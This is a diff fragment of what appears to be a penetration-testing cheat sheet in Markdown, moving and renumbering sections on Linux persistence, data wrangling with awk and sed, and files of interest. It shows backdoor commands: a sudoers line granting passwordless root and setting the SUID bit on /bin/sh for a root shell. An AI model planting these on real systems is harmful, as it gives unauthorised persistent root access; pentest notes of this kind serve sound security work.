+or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.
+
+```sh
+sudo chmod u+s /bin/sh
+```
+
+## 6.5 Data Wrangling on Linux
 
 Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
 be able to quickly sift through it to get the parts you care about.
 
-### 6.11.1 Awk & Sed
+### 6.5.1 Awk & Sed
 
 ```sh
 # grab lines of text between start and end delimiters.
@@ -4673,28 +5131,7 @@ sed -n '/PAT1/,/PAT2/{//!p;}' FILE
 sed '/PAT1/,/PAT2/!d;//d' FILE
 ```
 
-## 6.12 Linux Persistence
-
-### 6.12.1 Grant passwordless sudo access
-
-Edit the `/etc/sudoers` file to have the following line:
-
-```
-myuser ALL=(ALL) NOPASSWD: ALL
-```
-
-### 6.12.2 Setting SUID bit
-
-If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
-or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
-you can use those to give yourself a root shell. This is a kind of privesc
-backdoor.
-
-```sh
-sudo chmod u+s /bin/sh
-```
-
-## 6.13 Linux Files of Interest
+## 6.6 Linux Files of Interest
 
 ```sh
 # quick command to grab the goods
